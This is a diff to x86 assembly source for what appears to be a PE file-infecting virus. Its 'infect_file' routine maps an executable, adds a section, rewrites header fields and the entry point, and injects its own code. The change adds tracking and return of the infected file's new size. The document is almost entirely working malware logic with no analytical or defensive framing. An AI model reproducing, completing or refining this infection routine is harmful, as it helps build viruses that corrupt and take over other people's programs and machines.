@@ -7,7 +7,7 @@ include	utils.asm
 
 ; Parse and modify the executable mapped in memory to inject our code.
 ; ebx = delta offset
-infect_file PROC NEAR fileptr:DWORD, virtualalloc_addr:DWORD, virtualfree_addr:DWORD
+infect_file PROC NEAR fileptr:DWORD, filesize:DWORD, virtualalloc_addr:DWORD, virtualfree_addr:DWORD
 
 LOCAL	lastsec_ptrtorawdata:DWORD
 LOCAL	lastsec_sizeofrawdata:DWORD
@@ -22,10 +22,10 @@ LOCAL	ptr_sizeofheaders:DWORD
 
 LOCAL	imagebase:DWORD
 LOCAL	filealignment:DWORD
-LOCAL	sectionalignment:DWORD
-LOCAL	pointertorawdata:DWORD
 LOCAL	oldentrypoint:DWORD
+LOCAL	pointertorawdata:DWORD
 LOCAL	ptr_sectionhdrtable:DWORD
+LOCAL	sectionalignment:DWORD
 LOCAL	tmpbuf:DWORD
 
 	pushad
@@ -207,13 +207,16 @@ dont_move_sections:
 	mov		ecx, end_copy - begin_copy
 	invoke	ceil_align, ecx, filealignment	; Align size of our code with fileAlignment
 	mov		[esi], eax					; Wrote SizeOfRawData
+	mov		filesize, eax				; new filesize, still need to add pointertorawdata (step 1/2)
 
 	add		esi, 04h					; esi -> IMAGE_SECTION_HEADER[last + 1].PointerToRawData
 	mov		ecx, lastsec_ptrtorawdata
 	add		ecx, lastsec_sizeofrawdata
-	add		ecx, 0200h					; For when we move the sections (see arround update_sec_hdrs: label)
+	add		ecx, 0200h					; For when we move the sections (see around update_sec_hdrs: label)
 	mov		[esi], ecx					; Wrote PointerToRawData
 	mov		pointertorawdata, ecx
+	add		ecx, filesize				;
+	mov		filesize, ecx				; Got our new file size (step 2/2)
 
 	pop		esi							; esi -> IMAGE_SECTION_HEADER[last + 1]
 	add		esi, 024h					; esi -> IMAGE_SECTION_HEADER[last + 1].Characteristics
@@ -250,12 +253,6 @@ dont_move_sections:
 	invoke	ceil_align, edx, sectionalignment
 	mov		[ecx], eax					; Updated SizeOfImage
 
-;	mov		ecx, ptr_sizeofheaders
-;	mov		edx, [ecx]
-;	add		edx, SIZEOF IMAGE_SECTION_HEADER
-;	invoke	ceil_align, edx, filealignment
-;	mov		[ecx], eax					; Updated SizeOfHeaders
-
 ; --------------------------------------> PE fields updated.
 ; --------------------------------------> Let's write our code where it belongs.
 
@@ -277,11 +274,12 @@ dont_move_sections:
 
 	popad
 
-	mov		eax, 1
-	jmp		end_infect					; return 0 or 1 depending on error.
+	; mov		eax, 1
+	; jmp		end_infect					; return 0 or 1 depending on error.
 infect_err:
-	mov		eax, 0
 end_infect:
+	mov		eax, filesize
+
 	ret
 infect_file ENDP
 
